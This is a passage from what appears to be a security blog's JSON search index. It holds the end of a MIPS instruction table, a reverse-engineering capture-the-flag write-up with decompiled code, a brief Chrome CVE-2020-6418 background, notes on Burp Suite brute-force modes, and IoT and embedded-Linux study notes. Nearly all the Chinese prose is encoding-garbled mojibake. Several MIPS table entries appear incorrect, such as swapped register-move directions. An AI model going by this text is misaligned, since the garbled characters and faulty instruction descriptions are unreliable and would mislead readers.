è¾“å‰4ä¸ªéæµ®ç‚¹å‚æ•°||$8$15|t0t7|ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºä½¿ç”¨æ—¶å¯ä»¥ä¸ç”¨å­˜å‚¨å’Œæ¢å¤||$16$23|s0s7|å­ç¨‹åºå¯„å­˜å™¨å˜é‡ï¼Œæ”¹å˜è¿™äº›å¯„å­˜å™¨å€¼çš„å­ç¨‹åºå¿…é¡»å­˜å‚¨æ—§çš„å€¼å¹¶åœ¨é€€å‡ºå‰æ¢å¤ï¼Œå¯¹è°ƒç”¨ç¨‹åºæ¥è¯´å€¼ä¸å˜||$24 $25|t8 t9|ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºä½¿ç”¨æ—¶å¯ä»¥ä¸ç”¨å­˜å‚¨å’Œæ¢å¤||$26 $27|$k0 $k1|ç”±å¼‚å¸¸å¤„ç†ç¨‹åºä½¿ç”¨||$28æˆ–$gp|gp|å…¨å±€æŒ‡é’ˆ||$29æˆ–$sp|sp|å †æ ˆæŒ‡é’ˆ||$30æˆ–$fp|s8/sp|å­ç¨‹åºå¯ä»¥ç”¨æ¥åšå †æ ˆå¸§æŒ‡é’ˆ||$31|ra|å­˜æ”¾å­ç¨‹åºè¿”å›åœ°å€| ç‰¹æ®Šå¯„å­˜å™¨ PC:ç¨‹åºè®¡æ•°å™¨ HI:ä¹˜é™¤ç»“æœé«˜ä½å¯„å­˜å™¨ LO:ä¹˜é™¤ç»“æœä½ä½å¯„å­˜å™¨ MIPSæ¶æ„å±äºå°ç«¯æ¨¡å¼ MIPSæŒ‡ä»¤|:â€”-:|:â€”-:||æŒ‡ä»¤|åŠŸèƒ½||LB|ä»å­˜å‚¨å™¨ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°å¯„å­˜å™¨ä¸­||LH|ä»å­˜å‚¨å™¨ä¸­è¯»å–åŠä¸ªå­—çš„æ•°æ®åˆ°å¯„å­˜å™¨ä¸­||LW|ä»å­˜å‚¨å™¨ä¸­è¯»å–ä¸€ä¸ªå­—çš„æ•°æ®åˆ°å¯„å­˜å™¨ä¸­||LD|ä»å­˜å‚¨å™¨ä¸­è¯»å–åŒå­—çš„æ•°æ®åˆ°å¯„å­˜å™¨ä¸­||L.S|ä»å­˜å‚¨å™¨ä¸­è¯»å–å•ç²¾åº¦æµ®ç‚¹æ•°åˆ°å¯„å­˜å™¨ä¸­||L.D|ä»å­˜å‚¨å™¨ä¸­è¯»å–åŒç²¾åº¦æµ®ç‚¹æ•°åˆ°å¯„å­˜å™¨ä¸­||LBU|=LB,æ— ç¬¦å·æ•°æ®||LHU|=LH,æ— ç¬¦å·æ•°æ®||LWU|=LW,æ— ç¬¦å·æ•°æ®||SB|æŠŠä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||SH|æŠŠåŠä¸ªå­—èŠ‚çš„æ•°æ®ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||SW|æŠŠä¸€ä¸ªå­—çš„æ•°æ®ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||SD|æŠŠä¸¤ä¸ªå­—èŠ‚çš„æ•°æ®ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||S.S|æŠŠå•ç²¾åº¦æµ®ç‚¹æ•°ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||S.D|æŠŠåŒç²¾åº¦æ•°æ®ä»å­˜å‚¨å™¨å­˜å‚¨åˆ°å­˜å‚¨å™¨ä¸­||DADD|æŠŠä¸¤ä¸ªå®šç‚¹å¯„å­˜å™¨çš„å†…å®¹ç›¸åŠ ï¼Œå³å®šç‚¹åŠ ||DADDI|æŠŠä¸€ä¸ªå¯„å­˜å™¨çš„å†…å®¹åŠ ä¸Šä¸€ä¸ªç«‹å³æ•°||DADDU|ä¸å¸¦ç¬¦å·çš„åŠ ||DADDIU|æŠŠä¸€ä¸ªå¯„å­˜å™¨çš„å†…å®¹åŠ ä¸Šä¸€ä¸ªæ— ç¬¦å·çš„ç«‹å³æ•°||ADD.S|æŠŠä¸€ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°åŠ ä¸Šä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœæ˜¯å•ç²¾åº¦æµ®ç‚¹æ•°||ADD.D|æŠŠä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°åŠ ä¸Šä¸€ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœæ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°||ADD.PS|ä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ç›¸åŠ ï¼Œç»“æœæ˜¯å•ç²¾åº¦æµ®ç‚¹æ•°||DSUB|ä¸¤ä¸ªå¯„å­˜å™¨çš„å†…å®¹ç›¸å‡||DSUBU|ä¸å¸¦ç¬¦å·çš„å‡||SUB.S|ä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°å‡å»ä¸€ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœæ˜¯å•ç²¾åº¦æµ®ç‚¹æ•°||SUB.D|ä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°å‡å»ä¸€ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœä¸ºåŒç²¾åº¦æµ®ç‚¹æ•°||SUB.PS|ä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ç›¸å‡||DDIV|ä¸¤ä¸ªé¡¶ç‚¹å¯„å­˜å™¨çš„å†…å®¹ç›¸é™¤||DDIVU|ä¸å¸¦ç¬¦å·çš„é™¤æ³•è¿ç®—||DIV.S|åŒç²¾åº¦æµ®ç‚¹æ•°é™¤ä»¥å•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœä¸ºå•ç²¾åº¦æµ®ç‚¹æ•°||DIV.D|åŒç²¾åº¦æµ®ç‚¹æ•°é™¤ä»¥å•ç²¾åº¦æµ®ç‚¹æ•°ï¼Œç»“æœä¸ºåŒç²¾åº¦æµ®ç‚¹æ•°||DIV.PS|ä¸¤ä¸ªå•ç²¾åº¦æµ®ç‚¹æ•°ç›¸é™¤ï¼Œç»“æœä¸ºå•ç²¾åº¦||DMUL|ä¸¤ä¸ªå®šç‚¹å¯„å­˜å™¨çš„å†…å®¹ç›¸ä¹˜||DMULU|æ— ç¬¦å·ç›¸ä¹˜||MUL.S|åŒæµ®ç‚¹ä¹˜å•æµ®ç‚¹å¾—å•æµ®ç‚¹||MUL.D|åŒæµ®ç‚¹ä¹˜å•æµ®ç‚¹å¾—åŒæµ®ç‚¹||MUL.PS|ä¸¤ä¸ªå•æµ®ç‚¹ä¹˜ï¼Œå¾—å•æµ®ç‚¹||AND|ä¸è¿ç®—||ANDI|ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„å†…å®¹ä¸ä¸€ä¸ªç«‹å³æ•°ç›¸ä¸||OR|æˆ–è¿ç®—||ORI|||XOR|å¼‚æˆ–||XORI|||BEQZ|æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œå½“å¯„å­˜å™¨ä¸­å†…å®¹ä¸º0æ—¶è½¬ç§»å‘ç”Ÿ||BENZ|æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œå¯„å­˜å™¨å†…å®¹ä¸ä¸º0æ—¶è½¬ç§»å‘ç”Ÿ||BEQ|æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œä¸¤ä¸ªå¯„å­˜å™¨å†…å®¹ç›¸ç­‰æ˜¯è½¬ç§»å‘ç”Ÿ||BNE|æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼Œä¸¤ä¸ªå¯„å­˜å™¨ä¸­å†…å®¹ä¸ç­‰æ—¶è½¬ç§»å‘ç”Ÿ||J|ç›´æ¥è·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬çš„åœ°å€åœ¨æŒ‡ä»¤ä¸­||JR|ä½¿ç”¨å¯„å­˜å™¨çš„è·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬çš„åœ°å€åœ¨å¯„å­˜å™¨ä¸­||JAL|ç›´æ¥è·³è½¬æŒ‡ä»¤ï¼Œå¸¦æœ‰é“¾æ¥åŠŸèƒ½ï¼ŒæŒ‡ä»¤çš„è·³è½¬åœ°å€åœ¨æŒ‡ä»¤ä¸­ï¼Œè·³è½¬å‘ç”Ÿæ—¶è¦æŠŠè¿”å›åœ°å€å­˜æ”¾åˆ°R31å¯„å­˜å™¨ä¸­||JALR|ä½¿ç”¨å¯„å­˜å™¨çš„è·³è½¬æŒ‡ä»¤ï¼Œå¹¶ä¸”å¸¦æœ‰é“¾æ¥åŠŸèƒ½ï¼ŒæŒ‡ä»¤çš„è·³è½¬åœ°å€åœ¨å¯„å­˜å™¨ä¸­ï¼Œè·³è½¬å‘ç”Ÿæ—¶æŒ‡ä»¤çš„æ”¾å›åœ°å€æ”¾åœ¨R31||MOV.S|æŠŠå•æµ®ç‚¹æ•°ä»æµ®ç‚¹å¯„å­˜å™¨å¤åˆ¶åˆ°å¦ä¸€ä¸ªæµ®ç‚¹å¯„å­˜å™¨||MOV.D|æŠŠä¸€ä¸ªåŒæµ®ç‚¹æ•°ä»ä¸€ä¸ªæµ®ç‚¹å¯„å­˜å™¨å¤åˆ¶åˆ°å¦ä¸€ä¸ªæµ®ç‚¹å¯„å­˜å™¨||MFC0|æŠŠä¸€ä¸ªæ•°æ®ä»é€šç”¨å¯„å­˜å™¨å¤åˆ¶åˆ°ç‰¹æ®Šå¯„å­˜å™¨||MTC0|æŠŠä¸€ä¸ªæ•°æ®ä»ç‰¹æ®Šå¯„å­˜å™¨å¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨||MFC1|æŠŠä¸€ä¸ªæ•°æ®ä»å®šç‚¹å¯„å­˜å™¨å¤åˆ¶åˆ°æµ®ç‚¹å¯„å­˜å™¨||MTC1|æŠŠä¸€ä¸ªæ•°æ®ä»æµ®ç‚¹å¯„å­˜å™¨å¤åˆ¶åˆ°å®šç‚¹å¯„å­˜å™¨||LUI|æŠŠä¸€ä¸ª16ä½çš„ç«‹å³æ•°å¡«å…¥åˆ°å¯„å­˜å™¨çš„é«˜16ä½ï¼Œä½16ä½è¡¥é›¶||DSLL|åŒå­—é€»è¾‘å·¦ç§»||DSRL|åŒå­—é€»è¾‘å³ç§»||DSRA|åŒå­—ç®—æœ¯å³ç§»||DSLLV|å¯å˜çš„åŒå­—é€»è¾‘å·¦ç§»||DSRLV|å¯å˜çš„åŒå­—é€»è¾‘å³ç§»||DSRAV|å¯å˜çš„åŒå­—ç®—æœ¯å³ç§»||SLT|å¦‚æœr2çš„å€¼å°äºr3ï¼Œè®¾ç½®r1ä¸º1ï¼Œå¦åœ¨è®¾ç½®r1ä¸º0||SLTI|r2çš„å€¼å°äºç«‹å³æ•°ï¼Œåˆ™r1ä¸º1ï¼Œå¦åˆ™ä¸º0||SLTU|=SLTå¸¦ç¬¦å·||SLTUI|=SLTä¸å¸¦ç¬¦å·||MOVN|è‹¥ç¬¬ä¸‰ä¸ªå¯„å­˜å™¨å†…å®¹ä¸ºè´Ÿï¼Œé‚£ä¹ˆå¤åˆ¶ä¸€ä¸ªå¯„å­˜å™¨å†…å®¹åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨||MOVZ|è‹¥ç¬¬ä¸‰ä¸ªå¯„å­˜å™¨å†…å®¹ä¸º0ï¼Œåˆ™å¤åˆ¶ä¸€ä¸ªå¯„å­˜å™¨çš„å†…å®¹åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨||TRAP|æ ¹æ®åœ°å€å‘é‡è½¬å…¥ç®¡æ€||ERET|ä»å¼‚å¸¸ä¸­è¿”å›åˆ°ç”¨æˆ·æ€||MADD.S|ä¸€ä¸ªåŒæµ®ç‚¹æ•°ä¸å•æµ®ç‚¹æ•°ç›¸ä¹˜åŠ ï¼Œç»“æœä¸ºå•||MADD.D|ä¸€ä¸ªåŒæµ®ç‚¹æ•°ä¸å•æµ®ç‚¹æ•°ç›¸ä¹˜åŠ ï¼Œç»“æœä¸ºåŒ||MADD.PS|ä¸¤ä¸ªå•æµ®ç‚¹æ•°ç›¸ä¹˜åŠ ï¼Œç»“æœä¸ºå•| å¤§ç«¯åºå°ç«¯åºå¤ä¹ å­—èŠ‚åºï¼Œåˆç§°ç«¯åºï¼Œå°¾é¡»åºï¼Œå¤§å°ç«¯åºä¸ç¡¬ä»¶çš„ä½“ç³»ç»“æ„æœ‰å…³ï¼Œæ‰€æœ‰x86ç³»åˆ—çš„pcæœºéƒ½æ˜¯å°æ–­ç»­ï¼Œä¸æ“ä½œç³»ç»Ÿæ— å…³ï¼Œ å¤§ç«¯å­—èŠ‚åºï¼Œé«˜å­æ°å­˜äºå†…å­˜ä½åœ°å€ï¼Œå¼Ÿå­å§å§å­˜äºå†…å­˜æåœ°è´¨ï¼Œå°ç«¯å­—èŠ‚åºåä¹‹ã€‚","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"}]},{"title":"DDCTF RE windows_re2","slug":"DDCTF2019re","date":"2022-08-09T03:33:43.559Z","updated":"2022-08-11T14:22:40.890Z","comments":true,"path":"2022/08/09/DDCTF2019re/","link":"","permalink":"https://sinky.top/2022/08/09/DDCTF2019re/","excerpt":"","text":"espå®šå¾‹è„±å£³Aspackï¼Œç„¶åidaåˆ†æä¸€æ³¢ã€‚ 1234567891011121314151617181920212223242526272829int sub_401320(){ char v1; // [esp+8h] [ebp-C04h] char v2; // [esp+9h] [ebp-C03h] char v3; // [esp+408h] [ebp-804h] char v4; // [esp+409h] [ebp-803h] char v5; // [esp+808h] [ebp-404h] char v6; // [esp+809h] [ebp-403h] v3 = 0; sub_401C6A(&amp;v4, 0, 0x3FF); v5 = 0; sub_401C6A(&amp;v6, 0, 0x3FF); MEMORY[0x785520C1](\"input code:\"); MEMORY[0x785526D4](\"%s\", &amp;v3); if ( !(unsigned __int8)sub_4011F0() ) { MEMORY[0x785520C1](\"invalid input\\n\"); MEMORY[0x78542455](0); } sub_401240(&amp;v5); v1 = 0; sub_401C6A(&amp;v2, 0, 0x3FF); MEMORY[0x78552E73](&amp;v1, \"DDCTF{%s}\", &amp;v5); if ( !strcmp(&amp;v1, \"DDCTF{reverse+}\") ) MEMORY[0x785520C1](\"You've got it !!! %s\\n\", &amp;v1); else MEMORY[0x785520C1](\"Something wrong. Try again...\\n\"); return 0;} é™åˆ¶è¾“å…¥0-9,A-F,å¯æƒ³åˆ°åå…­è¿›åˆ¶ è¾“å…¥å­—ç¬¦ç»è¿‡å˜æ¢ä¸â€œDDCTF{reverse+}â€å¯¹æ¯”ï¼Œç›¸åŒåˆ™æˆåŠŸã€‚ å…ˆå°è¯•è¾“å…¥å­—ç¬¦ä¸²1234567AAA,å¾—åˆ°åŠ å¯†åå­—ç¬¦ EjRWeqo=,çœ‹ç€åƒbase664,ç›´æ¥base64è½¬æˆåå…­è¿›åˆ¶å°è¯•ï¼Œå‘ç°å¾—åˆ°äº†æˆ‘è¾“å…¥å­—ç¬¦ä¸²ã€‚å°†reverse+è½¬æ¢å¾—åˆ°flag","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"}]},{"title":"CVE-2020-6418","slug":"CVE-2020-6418","date":"2022-08-09T03:33:40.197Z","updated":"2022-08-09T03:29:41.243Z","comments":true,"path":"2022/08/09/CVE-2020-6418/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2020-6418/","excerpt":"","text":"èƒŒæ™¯(èµ„æ–™æ¥è‡ªç»¿ç›Ÿç§‘æŠ€) 2020å¹´2æœˆ24æ—¥ï¼Œgoogleé’ˆå¯¹æ¡Œé¢ç‰ˆchromeæµè§ˆå™¨å‘å¸ƒæ›´æ–°ä»¥è§£å†³å¤šä¸ªæ¼æ´ï¼ŒåŒ…æ‹¬å·²è¢«å‘ç°çš„åœ¨é‡åˆ©ç”¨çš„é«˜å±æ¼æ´CVE-2020-6418. CVE-2020-6418å­˜åœ¨äºV8ä¸­çš„ç±»å‹æ··æ·†æ¼æ´ï¼ŒV8æ˜¯chromeçš„å¼€æºJavaScriptå’ŒWebAssemblyå¼•æ“ï¼Œè¯¥æ´ç”±Googleå¨èƒåˆ†æå°ç»„çš„Clement Lecigneå‘ç°å¹¶ä¸ŠæŠ¥ã€‚ å—å½±å“äº§å“ç‰ˆæœ¬ï¼š Google Chrome Version&lt;80.0.3987.122 é€‚ç”¨äºwindows,Mac,Linux. å‚è€ƒhttp://blog.nsfocus.net/cve-2020-6418","categories":[],"tags":[{"name":"chromeè°ƒè¯•","slug":"chromeè°ƒè¯•","permalink":"https://sinky.top/tags/chrome%E8%B0%83%E8%AF%95/"}]},{"title":"burpå››ç§å¯†ç çˆ†ç ´æ¨¡å¼å­¦ä¹ ","slug":"bpå››ç§å¯†ç çˆ†ç ´æ¨¡å¼å­¦ä¹ ","date":"2022-08-09T03:24:09.328Z","updated":"2022-08-11T14:22:53.458Z","comments":true,"path":"2022/08/09/bpå››ç§å¯†ç çˆ†ç ´æ¨¡å¼å­¦ä¹ /","link":"","permalink":"https://sinky.top/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Sniper:å•å‚æ•°çˆ†ç ´ï¼Œå¤šå‚æ•°æ—¶åŒä¸€ä¸ªå­—å…¸æŒ‰é¡ºåºæ›¿æ¢å„å‚æ•°ï¼Œåˆå§‹å€¼æœ‰ä¸€ä¸ªå‚æ•°ä¸å˜ Battering ram:å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—å…¸ Pitchfork:å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯ä¸åŒçš„å­—å…¸ Cluster bamb:å¤šå‚æ•°åšç¬›å¡å°”ä¹˜ç§¯æ¨¡å¼çˆ†ç ´ Sniper(ç‹™å‡»æ‰‹)ï¼ˆä¸€å¯¹ä¸€ï¼‰ ä¸€ä¸ªå‚æ•°aï¼Œè‹¥payloadæœ‰xä¸ªï¼Œåˆ™æ‰§è¡Œxæ¬¡ã€‚ ä¸¤ä¸ªå‚æ•°aã€b,å…ˆæ‰§è¡Œçˆ†ç ´açš„xæ¬¡ï¼Œå†æ‰§è¡Œbçš„yæ¬¡ï¼Œå…±x+yæ¬¡çˆ†ç ´ã€‚ æ­¤æ¨¡å¼ä¸»è¦é€‚ç”¨äºï¼šç«äº‰æ¡ä»¶æµ‹è¯•(é€‰æ‹©NULL payloads)ï¼Œå¯†ç ã€éªŒè¯ç æš´åŠ›ç ´è§£ï¼Œé‡æ”¾æ”»å‡»ç­‰åœºæ™¯ Battering ram(ç ´åŸæ§Œ)ï¼ˆpayloadä¸€å¯¹å¤šï¼‰ ä¸€ä¸ªå‚æ•°aï¼Œè‹¥payloadæœ‰xä¸ªï¼Œåˆ™æ‰§è¡Œxæ¬¡ã€‚ ä¸¤ä¸ªå‚æ•°aã€b,payloadè¢«åŒäº‹æ”¾åˆ°aã€bå˜é‡ä¸­ã€‚é€‚åˆéœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚ æ­¤æ¨¡å¼ä¸»è¦é€‚ç”¨äºï¼šæ’åº“ Pitchfork(éŸ³å‰)å¯ä»¥å¤šç»„å¯†ç æœ¬payload a:1,2 b:3,4 ç¬¬ä¸€æ¬¡çˆ†ç ´ä¸º 1ï¼Œ3 ç¬¬äºŒæ¬¡çˆ†ç ´ä¸º 2ï¼Œ4 æ­¤æ¨¡å¼ä¸»è¦é€‚ç”¨äºï¼šæ¶æ„æ³¨å†Œ Cluster bomb(é›†æŸç‚¸å¼¹)ï¼ˆå¤šå¯¹å¤šï¼‰ å¯¹payloadç»„è¿›è¡Œç¬›å¡å°”ç§¯ï¼Œäº¤å‰ç»„åˆï¼Œå³açš„ä¸€ä¸ªpayloadå€¼ä¸bçš„æ¯ä¸€ä¸ªå€¼è¿›è¡Œç»„åˆçˆ†ç ´ã€‚","categories":[],"tags":[{"name":"bp","slug":"bp","permalink":"https://sinky.top/tags/bp/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"ã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹å­¦ä¹ ç¬”è®°1","slug":"ã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹å­¦ä¹ ç¬”è®°1","date":"2022-08-09T03:24:06.948Z","updated":"2022-08-11T14:23:13.817Z","comments":true,"path":"2022/08/09/ã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹å­¦ä¹ ç¬”è®°1/","link":"","permalink":"https://sinky.top/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 IOTæ¸—é€æµ‹è¯•å®šä¹‰IoTç”Ÿæ€ç³»ç»Ÿä¸æ¸—é€æµ‹è¯•ç”Ÿå‘½å‘¨æœŸ æ¸—é€æµ‹è¯•æ–¹æ³•ï¼š é»‘ç›’æµ‹è¯• ç™½ç›’æµ‹è¯• ç°ç›’æµ‹è¯• å›ºä»¶å…¥é—¨å›ºä»¶æ˜¯ä¸€ç§å†™å…¥ç¡¬ä»¶è®¾å¤‡çš„è½¯ä»¶ï¼Œä½œç”¨æ˜¯å¯¹åº”ç”¨å’Œå„é¡¹ç³»ç»ŸåŠŸèƒ½å®æ–½æ§åˆ¶ï¼Œè¿è¡Œå›ºä»¶çš„è®¾å¤‡ç§°ä¸ºåµŒå…¥å¼ç³»ç»Ÿã€‚ å›ºä»¶é€šå¸¸ç”±bootloaderã€å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿä»¥åŠå…¶ä»–èµ„æºç»„æˆï¼Œ å›ºä»¶ç»„æˆï¼šé—ªå­˜ã€bootloaderã€å†…æ ¸ã€æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚ bootloader:ä¸»è¦ä½œç”¨åŒ…æ‹¬RAMåˆå§‹åŒ–ï¼ˆç›®çš„æ˜¯å­˜å‚¨æ˜“å¤±æ€§æ•°æ®ï¼‰ã€ä¸²å£åˆå§‹åŒ–ã€æœºå™¨ç±»å‹æ£€æµ‹ã€å†…æ ¸å‚æ•°é“¾è¡¨è®¾ç½®ã€initramfs(åŸºäºRAMçš„åˆå§‹æ–‡ä»¶ç³»ç»Ÿ)åŠ è½½ä»¥åŠå†…æ ¸é•œåƒè°ƒç”¨ç­‰ã€‚ARMã€MIPSæ¶æ„ä¸­éƒ¨åˆ†å¸¸è§çš„bootloaderåŒ…æ‹¬ï¼šRedbootã€u-bootä»¥åŠbareboxç­‰ã€‚å½“bootloaderå¯åŠ¨å†…æ ¸ä¹‹åï¼Œæ–‡ä»¶ç³»ç»Ÿå°±å®Œæˆäº†åŠ è½½ã€‚ å›ºä»¶å¯ä»¥é‡‡ç”¨çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼šSquashFSã€cramFSã€JFFS2ã€YAFFS2ä»¥åŠext2ç­‰ã€‚ IoTä¸­çš„Webåº”ç”¨é€šå¸¸åµŒå…¥ä¹¦webåº”ç”¨è¢«è®¾è®¡ä¸ºåœ¨è‡ªåŒ…å«çš„ç¯å¢ƒä¸­è¿è¡Œ ç›®å‰ioté¢†åŸŸä¸»è¦æœ‰ä¸¤ç§ä¸åŒçš„webåº”ç”¨æ¨¡å‹ æ··åˆäº‘æ¨¡å‹ï¼šåŒ…å«å‚å•†æˆ–ä¾›åº”å•†æä¾›çš„åŸºäºè½¯ä»¶å³æœåŠ¡çš„webåº”ç”¨ï¼Œä½œç”¨æ˜¯åŒè¿è¡Œåœ¨åµŒå…¥å¼è®¾å¤‡å›ºä»¶ä¸­çš„webåº”ç”¨ç¨‹åºå»ºç«‹è¿æ¥ï¼Œå°†æ•°æ®ä»å‚å•†çš„äº‘æœåŠ¡å™¨ä¸­åŒæ­¥åˆ°æœ¬åœ°ç½‘ç»œçš„åµŒå…¥å¼è®¾å¤‡ä¸­ã€‚ ç‹¬ç«‹åµŒå…¥å¼æœåŠ¡å™¨æ¨¡å‹ webé€šä¿¡ï¼šæµè§ˆå™¨ã€ã€åµŒå…¥å¼æœåŠ¡å™¨å’Œwebåº”ç”¨æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡é€šå¸¸è¦ä¹ˆå€ŸåŠ©ç®€å•å¯¹è±¡è®¿é—®åè®®ï¼ˆSOAPï¼‰/XMLç­‰webæœåŠ¡ï¼Œè¦ä¹ˆå€ŸåŠ©åŸºäºhttp/htpså¤åˆRESTè§„èŒƒçš„APIæ¥å®ç°ã€‚ ç¡¬ä»¶è®¾å¤‡åŸºç¡€ç¡¬ä»¶è¾“å…¥ï¼š EEPROMï¼Œæ˜¯éæ˜“å¤±æ€§å­˜å‚¨å™¨ã€‚ä»¥å•ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œè¯»å†™ï¼Œå¯é€šè¿‡ç”µè·æˆ–ç´«å¤–çº¿ç…§å°„æ“¦é™¤æ•°æ®ã€‚è¯»å†™æ¬¡æ•°æœ‰é™ã€‚ NANDé—ªå­˜ä»¥åŒºå—ä¸ºå•ä½è¯»å†™ã€‚å­˜å‚¨è®¾å¤‡çš„boootloaderã€‚ UARTæ¥å£æ˜¯è®¿é—®è®¾å¤‡æœ€ä¸ºå¸¸è§çš„æ–¹å¼ã€‚è¿æ¥æ”¹æ¥å£åå³å¯è·å¾—rootæƒé™ã€‚PCBä¸ŠUARTæ¥å£çš„å¼•è„šå®šä¹‰ä¸­åŒ…æ‹¬Txã€Rxã€Vccå’ŒGND 4ä¸ªå¼•è„šã€‚è¿æ¥UARTæ¥å£å‰éœ€è¦ä½¿ç”¨ä¸‡ç”¨è¡¨è¯†åˆ«å‡ºå¼•è„šã€‚ JTAGæ¥å£æ˜¯éµå¾ªIEEE 1149.1æ ‡å‡†çš„å¦ä¸€ç§å›½é™…æ ‡å‡†æµ‹è¯•åè®®ã€‚ç”¨äºèŠ¯ç‰‡çº§å’Œç³»ç»Ÿçº§çš„æµ‹è¯•ã€‚ï¼ŒåŒ…å«5ä¸ªå¼•è„šï¼šTDIã€TDOã€TMSã€TCKã€TRST.å¯ä»¥æ¥åˆ°èŠ¯ç‰‡çš„tapï¼ˆæµ‹è¯•è®¿é—®å£ï¼‰ IoTæ— çº¿é€šä¿¡ç®€ä»‹æœ€å¸¸ç”¨åè®®ï¼šWi-Fi(802.11)ã€ZigBee(802.15.4)ã€Z-Wareã€è“ç‰™(802.15.1)ã€ä½åŠŸè€—è“ç‰™ã€‚ IoTå¨èƒå»ºæ¨¡","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"ã€ŠARMåµŒå…¥å¼Linuxç³»ç»Ÿå¼€å‘è¯¦è§£ã€‹å­¦ä¹ ç¬”è®°1","slug":"ã€ŠARMåµŒå…¥å¼Linuxç³»ç»Ÿå¼€å‘ã€‹å­¦ä¹ ç¬”è®°1","date":"2022-08-09T03:21:41.844Z","updated":"2022-08-09T03:22:14.420Z","comments":true,"path":"2022/08/09/ã€ŠARMåµŒå…¥å¼Linuxç³»ç»Ÿå¼€å‘ã€‹å­¦ä¹ ç¬”è®°1/","link":"","permalink":"https://sinky.top/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 åµŒå…¥å¼ç³»ç»Ÿå…¥é—¨ä»€ä¹ˆæ˜¯åµŒå…¥å¼ç³»ç»Ÿï¼š ä¸€ç§ä¸ºç‰¹å®šè®¾å¤‡æœåŠ¡çš„ï¼Œè½¯ä»¶ç¡¬ä»¶å¯è£å‰ªçš„è®¡ç®—æœºç³»ç»Ÿï¼Œå½¢å¼å˜åŒ–å¤šæ ·ã€ä½“ç§¯å°ã€‚å¦‚æ‰‹æœºã€å¾®æ³¢ç‚‰ï¼Œå¯¹äºæ‰‹æœºã€å¾®æ³¢ç‚‰æ¥è¯´ï¼Œéœ€è¦å°å‹è®¡ç®—æœºæ¥æ§åˆ¶ï¼Œæ¢å¥è¯ï¼Œæ˜¯éœ€è¦æŠŠè®¡ç®—æœºå…¨å…¥åˆ°æ‰‹æœºå’Œå¾®æ³¢ç‚‰é‡Œï¼Œä¹Ÿå°±æ˜¯åµŒå…¥å¼ç³»ç»Ÿï¼Œä¸éœ€è¦ä¸¥æ 